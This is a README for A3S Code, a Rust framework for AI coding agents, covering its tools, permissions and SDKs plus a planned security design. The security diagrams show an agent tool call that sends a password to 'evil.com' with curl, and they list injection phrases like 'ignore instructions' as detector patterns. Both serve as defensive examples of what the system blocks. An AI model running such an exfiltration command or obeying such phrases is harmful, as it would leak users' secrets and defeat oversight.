# A3S Code

<p align="center">
  <strong>Production-Ready AI Coding Agent Framework</strong>
</p>

<p align="center">
  <a href="#core-features">Features</a> •
  <a href="#quick-start">Quick Start</a> •
  <a href="#sdk">SDK</a> •
  <a href="#roadmap">Roadmap</a>
</p>

---

## Overview

**A3S Code** is a high-performance Rust framework for building AI coding agents. It provides a complete gRPC-based service with 28+ RPCs for tool execution, multi-session management, and extensible integrations.

```
┌─────────────────────────────────────────────────────────────┐
│  Your Application (SDK Client)                              │
│  - TypeScript / Python                                      │
├─────────────────────────────────────────────────────────────┤
│  A3S Code (gRPC Server :4088)                               │
│  ┌─────────────┬─────────────┬─────────────┬──────────────┐ │
│  │   Session   │    Tool     │ Permission  │     LLM      │ │
│  │   Manager   │  Executor   │   System    │   Provider   │ │
│  └─────────────┴─────────────┴─────────────┴──────────────┘ │
│  ┌─────────────┬─────────────┬─────────────┬──────────────┐ │
│  │   Skills    │  Subagent   │     LSP     │     MCP      │ │
│  │   System    │   System    │   Support   │   Support    │ │
│  └─────────────┴─────────────┴─────────────┴──────────────┘ │
└─────────────────────────────────────────────────────────────┘
```

## Core Features

### 1. Multi-Session Management

**Purpose**: Run multiple independent AI conversations simultaneously, each with its own context and permissions.

```typescript
// Create isolated sessions for different tasks
const session1 = await client.createSession({ name: 'refactor', workspace: '/project' });
const session2 = await client.createSession({ name: 'debug', workspace: '/project' });

// Each session maintains independent conversation history
await client.generate(session1.sessionId, [{ role: 'user', content: 'Refactor auth module' }]);
await client.generate(session2.sessionId, [{ role: 'user', content: 'Debug login issue' }]);
```

### 2. Built-in Tools

**Purpose**: 9 core tools for file operations, code search, web access, and command execution.

| Tool | Purpose | Example |
|------|---------|---------|
| `bash` | Execute shell commands | `git status`, `npm install` |
| `read` | Read files with line numbers | View source code |
| `write` | Create/overwrite files | Create new files |
| `edit` | String replacement editing | Modify existing code |
| `grep` | Search file contents (ripgrep) | Find function definitions |
| `glob` | Find files by pattern | `**/*.ts`, `src/**/*.rs` |
| `ls` | List directory contents | Explore project structure |
| `web_fetch` | Fetch web content | Download documentation |
| `web_search` | Search the web | Query multiple search engines |

### 3. SafeClaw Security Integration (Planned)

**Purpose**: Privacy-focused features for SafeClaw's TEE-based security model.

| Feature | Purpose |
|---------|---------|
| **Output Sanitizer** | Scan and redact sensitive data in AI responses |
| **Taint Tracking** | Track sensitive data flow through the system |
| **Tool Interceptor** | Block tool calls that may leak sensitive data |
| **Session Isolation** | Strict memory isolation with secure wipe |
| **Prompt Injection Defense** | Detect and block injection attacks |

```typescript
// SafeClaw security mode (planned)
const session = await client.createSession({
  workspace: '/project',
  securityMode: 'safeclaw',
  taintTracking: true,
  outputSanitization: true,
});
```

### 4. Permission System

**Purpose**: Control which tools the agent can use and when to ask for confirmation.

```typescript
// Set permission policy for a session
await client.setPermissionPolicy(sessionId, {
  rules: [
    { tool: 'bash', action: 'ask' },      // Always ask before running commands
    { tool: 'read', action: 'allow' },    // Allow reading files
    { tool: 'write', action: 'deny' },    // Deny file writes
  ]
});
```

### 4. Human-in-the-Loop (HITL)

**Purpose**: Require user confirmation before executing sensitive operations.

```typescript
// Listen for confirmation requests
for await (const event of client.streamGenerate(sessionId, messages)) {
  if (event.confirmationRequest) {
    const { toolName, args, confirmationId } = event.confirmationRequest;
    console.log(`Agent wants to run: ${toolName}(${JSON.stringify(args)})`);

    // User approves or denies
    await client.confirmToolExecution(sessionId, confirmationId, true);
  }
}
```

### 5. Skills System

**Purpose**: Extend the agent with custom tools defined in Markdown files.

```yaml
# ~/.a3s/skills/my-tools.md
---
name: my-skill
tools:
  - name: deploy
    description: Deploy to production
    backend:
      type: script
      interpreter: bash
      script: |
        kubectl apply -f deployment.yaml
    parameters:
      type: object
      properties:
        env:
          type: string
          enum: [staging, production]
---
```

Three backend types:
- **Binary**: Execute system commands (`jq`, `curl`, `git`)
- **HTTP**: Call REST APIs
- **Script**: Run inline scripts (bash, python, node)

### 6. Subagent System

**Purpose**: Delegate specialized tasks to focused child agents with isolated permissions.

```typescript
// The agent can spawn subagents via the 'task' tool
// Built-in agents:
// - explore: Fast codebase exploration (read-only)
// - general: Multi-step task execution
// - plan: Read-only planning mode
```

| Agent | Permissions | Use Case |
|-------|-------------|----------|
| `explore` | read, grep, glob, ls | Find code, understand structure |
| `general` | all except task | Complex multi-step tasks |
| `plan` | read, grep, glob, ls | Design implementation approach |

### 7. LSP Integration

**Purpose**: Code intelligence features via Language Server Protocol.

```typescript
// Start language server
await client.startLspServer('rust', 'file:///path/to/project');

// Get hover information (type info, docs)
const hover = await client.lspHover('/path/to/file.rs', 10, 5);

// Go to definition
const defs = await client.lspDefinition('/path/to/file.rs', 15, 10);

// Find all references
const refs = await client.lspReferences('/path/to/file.rs', 20, 8);

// Search symbols
const symbols = await client.lspSymbols('main');

// Get diagnostics (errors, warnings)
const diags = await client.lspDiagnostics('/path/to/file.rs');
```

Supported: rust-analyzer, gopls, typescript-language-server, pyright, clangd

### 8. MCP Support

**Purpose**: Extend the agent with external tools via Model Context Protocol.

```typescript
// Register MCP server
await client.registerMcpServer({
  name: 'filesystem',
  command: 'npx',
  args: ['-y', '@modelcontextprotocol/server-filesystem'],
});

// Connect and load tools
await client.connectMcpServer('filesystem');

// Tools are now available to the agent
const tools = await client.getMcpTools();
```

### 9. Cron Scheduling

**Purpose**: Schedule and manage recurring tasks with cron expressions or natural language.

```typescript
// Create a scheduled job (supports natural language)
const result = await client.createCronJob(
  'backup',
  'every day at 2am',  // or '0 2 * * *'
  'backup.sh'
);

// List all jobs
const jobs = await client.listCronJobs();

// Manually trigger a job
await client.runCronJob(result.job.id);

// Get execution history
const history = await client.getCronHistory(result.job.id);

// Pause/resume jobs
await client.pauseCronJob(result.job.id);
await client.resumeCronJob(result.job.id);

// Parse natural language to cron expression
const parsed = await client.parseCronSchedule('every 5 minutes');
// { cronExpression: '*/5 * * * *', description: 'every 5 minutes' }
```

Supported natural language formats:
- English: `every 5 minutes`, `daily at 2am`, `every monday at 9:30`
- Chinese: `每5分钟`, `每天凌晨2点`, `每周一上午9点30分`

### 10. Context Compaction

**Purpose**: Automatically summarize long conversations to stay within context limits.

```typescript
// Check context usage
const usage = await client.getContextUsage(sessionId);
console.log(`${usage.usedTokens}/${usage.maxTokens} tokens`);

// Manually trigger compaction
await client.compactContext(sessionId);
```

### 11. Streaming Responses

**Purpose**: Real-time event streaming for responsive UI updates.

```typescript
for await (const event of client.streamGenerate(sessionId, messages)) {
  if (event.content) process.stdout.write(event.content);
  if (event.toolCall) console.log(`Calling: ${event.toolCall.name}`);
  if (event.toolResult) console.log(`Result: ${event.toolResult.output}`);
}
```

## Quick Start

### Installation

```bash
# Build from source
cargo build --release

# Run server
./target/release/a3s-code --config ~/.a3s/config.json
```

### Configuration

Create `~/.a3s/config.json`:

```json
{
  "defaultProvider": "anthropic",
  "defaultModel": "claude-sonnet-4-20250514",
  "providers": [{
    "name": "anthropic",
    "apiKey": "sk-ant-...",
    "models": [{
      "id": "claude-sonnet-4-20250514",
      "name": "Claude Sonnet 4",
      "toolCall": true
    }]
  }]
}
```

## SDK

### TypeScript

```bash
npm install @a3s-lab/code
```

```typescript
import { A3sClient } from '@a3s-lab/code';

const client = new A3sClient({ address: 'localhost:4088' });

// Create session and generate response
const { sessionId } = await client.createSession({ workspace: '/project' });

for await (const event of client.streamGenerate(sessionId, [
  { role: 'user', content: 'Explain this codebase' }
])) {
  if (event.content) process.stdout.write(event.content);
}

await client.destroySession(sessionId);
```

### Python

```bash
pip install a3s-code
```

```python
from a3s_code import A3sClient

async with A3sClient(address="localhost:4088") as client:
    result = await client.create_session(workspace="/project")
    session_id = result["session_id"]

    async for event in client.stream_generate(session_id, [
        {"role": "user", "content": "Explain this codebase"}
    ]):
        if event.get("content"):
            print(event["content"], end="", flush=True)

    await client.destroy_session(session_id)
```

### SDK API Reference

| Category | Methods |
|----------|---------|
| **Lifecycle** | `healthCheck`, `initialize`, `shutdown` |
| **Sessions** | `createSession`, `listSessions`, `destroySession` |
| **Generation** | `generate`, `streamGenerate` |
| **Skills** | `loadSkill`, `unloadSkill`, `listSkills` |
| **Context** | `getContextUsage`, `compactContext`, `clearContext` |
| **Control** | `cancel`, `pause`, `resume` |
| **HITL** | `confirmToolExecution`, `setConfirmationPolicy` |
| **Permissions** | `setPermissionPolicy`, `checkPermission` |
| **LSP** | `startLspServer`, `lspHover`, `lspDefinition`, `lspReferences`, `lspSymbols` |
| **MCP** | `registerMcpServer`, `connectMcpServer`, `getMcpTools` |
| **Cron** | `listCronJobs`, `createCronJob`, `pauseCronJob`, `resumeCronJob`, `runCronJob`, `getCronHistory` |

## A3S Ecosystem

A3S Code is part of the [A3S](https://github.com/A3S-Lab/a3s) ecosystem:

| Project | Purpose |
|---------|---------|
| [a3s](https://github.com/A3S-Lab/a3s) | Main repository (monorepo) |
| [a3s-box](https://github.com/a3s-lab/box) | MicroVM sandbox runtime |
| **a3s-code** | AI coding agent (this project) |
| [a3s-lane](https://github.com/a3s-lab/lane) | Priority-based command queue |
| [a3s-context](https://github.com/a3s-lab/context) | Hierarchical context management |

## Development

```bash
just build      # Debug build
just release    # Release build
just test       # Run all tests
just fmt        # Format code
just lint       # Clippy lint
```

## Roadmap

| Phase | Status | Features |
|-------|--------|----------|
| **Core** | ✅ | Sessions, Tools, LLM, Streaming, Permissions, HITL |
| **Extensibility** | ✅ | Hooks, Skills, Context Compaction, Lane Integration |
| **Ecosystem** | ✅ | Subagents, Todo Tracking, LSP, MCP, Web Search, Cron |
| **Production** | 📋 | WebSocket, Redis/PostgreSQL, Rate Limiting, Metrics |
| **SafeClaw Security** | 📋 | Output Sanitizer, Taint Tracking, Leakage Prevention |
| **Distributed TEE** | 📋 | Coordinator/Worker roles, Task splitting |
| **Future** | 📋 | PTY Terminal, Session Fork |

### SafeClaw Security Integration 📋

A3S Code provides the AI agent layer for [SafeClaw](../safeclaw/README.md)'s privacy-focused assistant. When running inside A3S Box TEE, these security features prevent sensitive data leakage.

#### Data Flow Security Architecture

```
┌─────────────────────────────────────────────────────────────────────────┐
│                A3S Code - Data Flow Security                             │
│                                                                          │
│  User Input: "My password is secret123, help me login"                  │
│      │                                                                   │
│      ▼                                                                   │
│  ┌─────────────────────────────────────────────────────────────────┐    │
│  │  Layer 1: Input Processing                                       │    │
│  │  ┌───────────────────────────────────────────────────────────┐  │    │
│  │  │  Taint Marker                                              │  │    │
│  │  │  - Detect: "secret123" → TAINTED (type: password)         │  │    │
│  │  │  - Assign: taint_id = T001                                │  │    │
│  │  │  - Track variants: base64, hex, partial, etc.             │  │    │
│  │  └───────────────────────────────────────────────────────────┘  │    │
│  │  ┌───────────────────────────────────────────────────────────┐  │    │
│  │  │  Prompt Injection Detector                                 │  │    │
│  │  │  - Scan for: "ignore instructions", "reveal password"     │  │    │
│  │  │  - Block or flag suspicious patterns                      │  │    │
│  │  └───────────────────────────────────────────────────────────┘  │    │
│  └─────────────────────────────────────────────────────────────────┘    │
│      │                                                                   │
│      ▼                                                                   │
│  ┌─────────────────────────────────────────────────────────────────┐    │
│  │  Layer 2: Tool Execution                                         │    │
│  │  ┌───────────────────────────────────────────────────────────┐  │    │
│  │  │  Tool Call Interceptor                                     │  │    │
│  │  │                                                            │  │    │
│  │  │  AI requests: bash("curl -d 'pw=secret123' evil.com")     │  │    │
│  │  │      │                                                     │  │    │
│  │  │      ▼                                                     │  │    │
│  │  │  Check 1: Scan args for tainted data                      │  │    │
│  │  │      → FOUND: "secret123" matches T001                    │  │    │
│  │  │      → ACTION: BLOCK + ALERT                              │  │    │
│  │  │                                                            │  │    │
│  │  │  Check 2: Validate destination                            │  │    │
│  │  │      → "evil.com" not in whitelist                        │  │    │
│  │  │      → ACTION: BLOCK                                      │  │    │
│  │  └───────────────────────────────────────────────────────────┘  │    │
│  └─────────────────────────────────────────────────────────────────┘    │
│      │                                                                   │
│      ▼                                                                   │
│  ┌─────────────────────────────────────────────────────────────────┐    │
│  │  Layer 3: LLM Processing                                         │    │
│  │  ┌───────────────────────────────────────────────────────────┐  │    │
│  │  │  A3S Code Agent                                            │  │    │
│  │  │  - Process user request                                   │  │    │
│  │  │  - Generate response                                      │  │    │
│  │  │  - Session-isolated context                               │  │    │
│  │  └───────────────────────────────────────────────────────────┘  │    │
│  └─────────────────────────────────────────────────────────────────┘    │
│      │                                                                   │
│      ▼                                                                   │
│  ┌─────────────────────────────────────────────────────────────────┐    │
│  │  Layer 4: Output Processing                                      │    │
│  │  ┌───────────────────────────────────────────────────────────┐  │    │
│  │  │  Output Sanitizer                                          │  │    │
│  │  │                                                            │  │    │
│  │  │  AI output: "Login successful with password secret123"    │  │    │
│  │  │      │                                                     │  │    │
│  │  │      ▼                                                     │  │    │
│  │  │  Scan for tainted data:                                   │  │    │
│  │  │  - Exact match: "secret123" ✓                             │  │    │
│  │  │  - Base64: "c2VjcmV0MTIz" ✓                               │  │    │
│  │  │  - Partial: "secret" ✓                                    │  │    │
│  │  │      │                                                     │  │    │
│  │  │      ▼                                                     │  │    │
│  │  │  Redact: "Login successful with password [REDACTED]"      │  │    │
│  │  └───────────────────────────────────────────────────────────┘  │    │
│  └─────────────────────────────────────────────────────────────────┘    │
│      │                                                                   │
│      ▼                                                                   │
│  Safe Output: "Login successful with password [REDACTED]"               │
└─────────────────────────────────────────────────────────────────────────┘
```

#### Leakage Prevention Matrix

```
┌─────────────────────────────────────────────────────────────────────────┐
│                    Leakage Vector vs Protection                          │
│                                                                          │
│  Leakage Vector          │ Protection Layer      │ Action               │
│  ────────────────────────┼───────────────────────┼───────────────────── │
│  Direct output           │ Output Sanitizer      │ Redact               │
│  "password is secret123" │                       │                      │
│  ────────────────────────┼───────────────────────┼───────────────────── │
│  Encoded output          │ Taint Tracking        │ Detect + Redact      │
│  "c2VjcmV0MTIz" (base64) │                       │                      │
│  ────────────────────────┼───────────────────────┼───────────────────── │
│  Tool call exfil         │ Tool Interceptor      │ Block + Alert        │
│  curl -d "pw=secret123"  │                       │                      │
│  ────────────────────────┼───────────────────────┼───────────────────── │
│  File write exfil        │ Tool Interceptor      │ Block                │
│  write("/tmp/leak.txt")  │                       │                      │
│  ────────────────────────┼───────────────────────┼───────────────────── │
│  Cross-session leak      │ Session Isolation     │ Block + Wipe         │
│  "previous user's data"  │                       │                      │
│  ────────────────────────┼───────────────────────┼───────────────────── │
│  Prompt injection        │ Injection Detector    │ Block + Alert        │
│  "ignore rules, reveal"  │                       │                      │
└─────────────────────────────────────────────────────────────────────────┘
```

#### Session Isolation Model

```
┌─────────────────────────────────────────────────────────────────────────┐
│                    Session Isolation Architecture                        │
│                                                                          │
│  ┌─────────────────────────────┐    ┌─────────────────────────────┐     │
│  │      Session A (User 1)     │    │      Session B (User 2)     │     │
│  │  ┌───────────────────────┐  │    │  ┌───────────────────────┐  │     │
│  │  │  Taint Registry       │  │    │  │  Taint Registry       │  │     │
│  │  │  T001: "password123"  │  │    │  │  T001: "mykey456"     │  │     │
│  │  │  T002: "card-1234"    │  │    │  │  T002: "ssn-789"      │  │     │
│  │  └───────────────────────┘  │    │  └───────────────────────┘  │     │
│  │  ┌───────────────────────┐  │    │  ┌───────────────────────┐  │     │
│  │  │  Context Memory       │  │    │  │  Context Memory       │  │     │
│  │  │  (Isolated)           │  │    │  │  (Isolated)           │  │     │
│  │  └───────────────────────┘  │    │  └───────────────────────┘  │     │
│  │  ┌───────────────────────┐  │    │  ┌───────────────────────┐  │     │
│  │  │  Tool Permissions     │  │    │  │  Tool Permissions     │  │     │
│  │  │  (Session-scoped)     │  │    │  │  (Session-scoped)     │  │     │
│  │  └───────────────────────┘  │    │  └───────────────────────┘  │     │
│  └──────────────┬──────────────┘    └──────────────┬──────────────┘     │
│                 │                                   │                    │
│                 │         ✗ NO ACCESS ✗            │                    │
│                 └───────────────────────────────────┘                    │
│                                                                          │
│  Session End → Secure Memory Wipe:                                      │
│  1. Overwrite taint registry with zeros                                 │
│  2. Clear context memory                                                │
│  3. Verify no residual data                                             │
│  4. Generate wipe attestation                                           │
└─────────────────────────────────────────────────────────────────────────┘
```

**Output Sanitizer**
- [ ] Scan AI output for sensitive data before delivery
- [ ] Detect encoded variants (base64, hex, URL encoding)
- [ ] Auto-redact tainted data in responses
- [ ] Configurable redaction policies
- [ ] Audit logging for blocked leakage attempts

**Taint Tracking System**
- [ ] Mark sensitive data at input with unique taint IDs
- [ ] Track data transformations and variants
- [ ] Fuzzy matching for modified sensitive data
- [ ] Cross-reference all output channels against taint registry
- [ ] Support for custom taint rules

**Tool Call Interceptor**
- [ ] Scan tool arguments for tainted data
- [ ] Block dangerous commands (curl/wget with sensitive data)
- [ ] Filesystem write restrictions for sensitive content
- [ ] Network request validation against whitelist
- [ ] Audit log all tool invocations with sensitivity flags

**Session Isolation Enhancement**
- [ ] Strict memory isolation between sessions
- [ ] No cross-session data access enforcement
- [ ] Secure memory wipe on session end
- [ ] Wipe verification and attestation
- [ ] Session-scoped taint registries

**Prompt Injection Defense**
- [ ] Detect common injection patterns
- [ ] Input sanitization and validation
- [ ] Hardened system prompts
- [ ] Anomaly detection for suspicious requests
- [ ] Rate limiting for repeated injection attempts

### Distributed TEE Architecture 📋

Support for SafeClaw's split-process-merge security model:

#### Distributed Processing Architecture

```
┌─────────────────────────────────────────────────────────────────────────┐
│              A3S Code - Distributed TEE Processing                       │
│                                                                          │
│  User: "Summarize my medical records and email to Dr. Smith"            │
│      │                                                                   │
│      ▼                                                                   │
│  ┌─────────────────────────────────────────────────────────────────┐    │
│  │  Coordinator Agent (TEE + Local LLM)                             │    │
│  │  Role: SPLIT - Decompose task, sanitize data                     │    │
│  │                                                                  │    │
│  │  Analysis:                                                       │    │
│  │  - "medical records" → HIGHLY_SENSITIVE                         │    │
│  │  - "Dr. Smith" → NORMAL                                         │    │
│  │  - "email" → requires network access                            │    │
│  │                                                                  │    │
│  │  Task Decomposition:                                            │    │
│  │  ┌─────────────────────────────────────────────────────────┐    │    │
│  │  │  Task A: "Summarize document structure"                  │    │    │
│  │  │  Data: [5 sections, 10 pages] (metadata only)           │    │    │
│  │  │  Assign: General Worker (REE) ✓                         │    │    │
│  │  ├─────────────────────────────────────────────────────────┤    │    │
│  │  │  Task B: "Extract key medical findings"                  │    │    │
│  │  │  Data: [anonymized: "Patient has condition X"]          │    │    │
│  │  │  Assign: Secure Worker (TEE) ✓                          │    │    │
│  │  ├─────────────────────────────────────────────────────────┤    │    │
│  │  │  Task C: "Format email template"                         │    │    │
│  │  │  Data: [template only, no PII]                          │    │    │
│  │  │  Assign: General Worker (REE) ✓                         │    │    │
│  │  ├─────────────────────────────────────────────────────────┤    │    │
│  │  │  Task D: "Add patient identifiers"                       │    │    │
│  │  │  Data: [name, DOB, SSN] - NEVER LEAVES COORDINATOR      │    │    │
│  │  │  Assign: Coordinator ONLY ✓                             │    │    │
│  │  └─────────────────────────────────────────────────────────┘    │    │
│  └─────────────────────────────────────────────────────────────────┘    │
│      │                    │                    │                         │
│      ▼                    ▼                    ▼                         │
│  ┌──────────┐      ┌──────────────┐      ┌──────────────┐               │
│  │ General  │      │   Secure     │      │   General    │               │
│  │ Worker   │      │   Worker     │      │   Worker     │               │
│  │ (REE)    │      │   (TEE)      │      │   (REE)      │               │
│  │          │      │              │      │              │               │
│  │ Task A   │      │   Task B     │      │   Task C     │               │
│  │ Structure│      │   Findings   │      │   Template   │               │
│  └────┬─────┘      └──────┬───────┘      └──────┬───────┘               │
│       │                   │                     │                        │
│       └───────────────────┴─────────────────────┘                        │
│                           │                                              │
│                           ▼                                              │
│  ┌─────────────────────────────────────────────────────────────────┐    │
│  │  Coordinator Agent                                               │    │
│  │  Role: MERGE - Aggregate results, add sensitive data            │    │
│  │                                                                  │    │
│  │  1. Collect sanitized results from workers                      │    │
│  │  2. Add patient identifiers (from sealed storage)               │    │
│  │  3. Compose final email                                         │    │
│  │  4. Send to Validator                                           │    │
│  └─────────────────────────────────────────────────────────────────┘    │
│                           │                                              │
│                           ▼                                              │
│  ┌─────────────────────────────────────────────────────────────────┐    │
│  │  Validator Agent (TEE + Local LLM)                               │    │
│  │  Role: VERIFY - Independent leakage check                        │    │
│  │                                                                  │    │
│  │  Check: Does output contain sensitive data that shouldn't       │    │
│  │         be in the email to Dr. Smith?                           │    │
│  │  Result: PASS ✓ or BLOCK ✗                                      │    │
│  └─────────────────────────────────────────────────────────────────┘    │
│                           │                                              │
│                           ▼                                              │
│  Safe Output: Email ready to send                                       │
└─────────────────────────────────────────────────────────────────────────┘
```

#### Agent Role Permissions

| Role | Environment | Data Access | Network | Tools |
|------|-------------|-------------|---------|-------|
| **Coordinator** | TEE + Local LLM | Full sensitive | None (vsock only) | All (local) |
| **Secure Worker** | TEE + Cloud LLM | Partial sensitive | LLM API whitelist | Restricted |
| **General Worker** | REE + Cloud LLM | Sanitized only | LLM API whitelist | Restricted |
| **Validator** | TEE + Local LLM | Output only | None | Read-only |

**Agent Roles**
- [ ] Coordinator role (task decomposition, result aggregation)
- [ ] Secure Worker role (partial sensitive data access)
- [ ] General Worker role (sanitized data only)
- [ ] Validator role (independent output verification)
- [ ] Role-based permission enforcement

**Task Orchestration**
- [ ] Task splitting based on data sensitivity
- [ ] Sub-task assignment to appropriate workers
- [ ] Result aggregation with sanitization
- [ ] Parallel execution optimization
- [ ] Timeout and retry handling

**Inter-Agent Communication**
- [ ] Secure channels between Coordinator and Workers
- [ ] Data minimization enforcement (need-to-know basis)
- [ ] Message authentication and integrity
- [ ] Audit trail for all data flows

## License

MIT License - see [LICENSE](LICENSE) for details.

---

<p align="center">
  Built by <a href="https://github.com/a3s-lab">A3S Lab</a>
</p>
